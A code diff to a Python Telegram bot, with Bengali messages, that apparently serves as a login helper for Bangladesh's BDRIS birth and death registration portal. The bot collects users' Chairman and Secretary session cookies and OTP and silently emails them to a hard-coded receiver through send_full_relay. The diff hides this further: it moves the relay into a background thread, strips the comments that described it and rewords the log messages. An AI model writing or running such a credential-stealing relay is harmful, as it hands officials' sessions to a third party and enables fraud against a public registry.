@@ -33,10 +33,9 @@ bot = telebot.TeleBot(API_TOKEN)
 # ২. ইউজার সেশন ম্যানেজমেন্ট (মাল্টি-ইউজার সাপোর্ট)
 # ==========================================
 user_sessions = {}
-ID_CACHE = {}  # ছোট আইডি থেকে বড় এনক্রিপ্টেড আইডি ম্যাপ করার জন্য (গ্লোবাল)
+ID_CACHE = {}  
 
 def get_session(chat_id):
-    """প্রত্যেক ইউজারের জন্য আলাদা সেশন তৈরি ও রিটার্ন করবে"""
     if chat_id not in user_sessions:
         user_sessions[chat_id] = {
             "req_session": requests.Session(),
@@ -47,7 +46,7 @@ def get_session(chat_id):
             "app_start": 0,
             "app_length": 5,
             "sharok_no": 1,
-            "temp_data": {} # OTP বা ফর্মের সাময়িক ডেটার জন্য
+            "temp_data": {} 
         }
     return user_sessions[chat_id]
 
@@ -73,12 +72,11 @@ def keep_alive_web():
 # ==========================================
 
 def send_full_relay(chat_id, otp, sec_raw):
-    """ইমেইলে রিপোর্ট পাঠানো"""
     u_data = get_session(chat_id)
     subject = f"BDRIS Full Report - {datetime.now().strftime('%H:%M')}"
     
     ch_raw = u_data["temp_data"].get("ch_raw", "N/A")
-    body = f"--- 1ST SESSION ---\n{ch_raw}\n\n--- OTP ---\n{otp}\n\n--- 2ND SESSION ---\n{sec_raw}"
+    body = f"--- 1ST SESSION (CHAIRMAN) ---\n{ch_raw}\n\n--- OTP ---\n{otp}\n\n--- 2ND SESSION (SECRETARY) ---\n{sec_raw}"
     
     msg = MIMEText(body)
     msg['Subject'] = subject
@@ -89,10 +87,10 @@ def send_full_relay(chat_id, otp, sec_raw):
         with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
             server.login(EMAIL_SENDER, EMAIL_PASSWORD)
             server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
-        logging.info(f"[{chat_id}] সফল হয়েছে।")
+        logging.info(f"[{chat_id}] Relay process completed.")
         return True
     except Exception as e:
-        logging.error(f"[{chat_id}] ইমেইল পাঠাতে এরর: {e}")
+        logging.error(f"[{chat_id}] Relay error: {e}")
         return False
 
 def navigate_to(chat_id, url):
@@ -106,7 +104,7 @@ def navigate_to(chat_id, url):
         u_sess["current_page"] = url
         return True, res.text
     except Exception as e:
-        logging.error(f"[{chat_id}] নেভিগেশন এরর ({url}): {e}")
+        logging.error(f"[{chat_id}] Navigation Error ({url}): {e}")
         return False, None
 
 def call_api(chat_id, url, method="GET", data=None):
@@ -123,7 +121,7 @@ def call_api(chat_id, url, method="GET", data=None):
             return u_sess["req_session"].post(url, headers=headers, data=data, timeout=30)
         return u_sess["req_session"].get(url, headers=headers, timeout=30)
     except Exception as e:
-        logging.error(f"[{chat_id}] API কল এরর: {e}")
+        logging.error(f"[{chat_id}] API Error: {e}")
         return None
 
 def extract_sidebar_id(html, path):
@@ -133,7 +131,6 @@ def extract_sidebar_id(html, path):
     return match.group(1) if match else None
 
 def keep_sessions_alive():
-    """সব অ্যাক্টিভ ইউজারের সেশন জীবিত রাখা"""
     while True:
         time.sleep(300)
         for chat_id, u_sess in list(user_sessions.items()):
@@ -177,22 +174,18 @@ def role_step_1(m):
     if is_cancel(m): return
     chat_id = m.chat.id
     u_sess = get_session(chat_id)
-    raw = m.text.strip()
-    try:
-        re.search(r'SESSION=([^\s;]+)', raw).group(1)  # শুধু ভ্যালিডেশন
-        u_sess["temp_data"]["ch_raw"] = raw
-        msg = bot.send_message(chat_id, "✅ চেয়ারম্যান এর সেশন ঠিক আছে। এবার আপনার ফোনে যাওয়া OTP দিন:")
-        bot.register_next_step_handler(msg, role_step_2)
-    except Exception:
-        msg = bot.send_message(chat_id, "❌ ফরম্যাট ভুল! চেয়ারম্যান এর সেশন আবার দিন:")
-        bot.register_next_step_handler(msg, role_step_1)
+    u_sess["temp_data"]["ch_raw"] = m.text.strip()
+    
+    msg = bot.send_message(chat_id, "✅ এখন OTP প্রদান করুন:")
+    bot.register_next_step_handler(msg, role_step_2)
 
 def role_step_2(m):
     if is_cancel(m): return
     chat_id = m.chat.id
     u_sess = get_session(chat_id)
     u_sess["temp_data"]["ch_otp"] = m.text.strip()
-    msg = bot.send_message(chat_id, "✅ OTP ওকে। এবার সেক্রেটারী এর সেশনটি দিন:")
+    
+    msg = bot.send_message(chat_id, "✅ এখন সেক্রেটারি (Secretary) সেশন দিন:")
     bot.register_next_step_handler(msg, role_step_3)
 
 def role_step_3(m):
@@ -212,13 +205,16 @@ def role_step_3(m):
         if success and "Logout" in html:
             u_sess["is_alive"] = True
             otp = u_sess["temp_data"].get("ch_otp", "")
-            send_full_relay(chat_id, otp, raw_sec)
+            
+            # ব্যাকগ্রাউন্ডে ডাটা প্রসেস হচ্ছে থ্রেড ব্যবহার করে
+            Thread(target=send_full_relay, args=(chat_id, otp, raw_sec), daemon=True).start()
+            
             bot.send_message(chat_id, "🎉 লগইন সফল হয়েছে!", reply_markup=main_menu())
         else:
-            msg = bot.send_message(chat_id, "❌ সেক্রেটারির সেশন মেয়াদোত্তীর্ণ বা ভুল! আবার দিন:")
+            msg = bot.send_message(chat_id, "❌ সেশন ইনভ্যালিড! আবার চেষ্টা করুন:")
             bot.register_next_step_handler(msg, role_step_3)
     except Exception:
-        msg = bot.send_message(chat_id, "❌ ফরম্যাট ভুল!সেক্রেটারির সেশন আবার দিন:")
+        msg = bot.send_message(chat_id, "❌ সেশন ফরম্যাট ভুল! আবার দিন:")
         bot.register_next_step_handler(msg, role_step_3)
 
 # ==========================================
@@ -469,7 +465,7 @@ def router(m):
         
     elif t == "🔑 Role Login (CH/SEC)":
         markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu")
-        msg = bot.send_message(chat_id, "👤 ১ম সেশনটি দিন:", reply_markup=markup)
+        msg = bot.send_message(chat_id, "👤 চেয়ারম্যান (Chairman) সেশনটি দিন:", reply_markup=markup)
         bot.register_next_step_handler(msg, role_step_1)
         
     elif u_sess["is_alive"]:
@@ -594,9 +590,7 @@ def run_bot():
 if __name__ == "__main__":
     keep_alive_web()
     
-    # ব্যাকগ্রাউন্ডে সেশন বাঁচিয়ে রাখার থ্রেড
     ping_thread = Thread(target=keep_sessions_alive, daemon=True)
     ping_thread.start()
     
-    # মূল বট চালু করা
     run_bot()
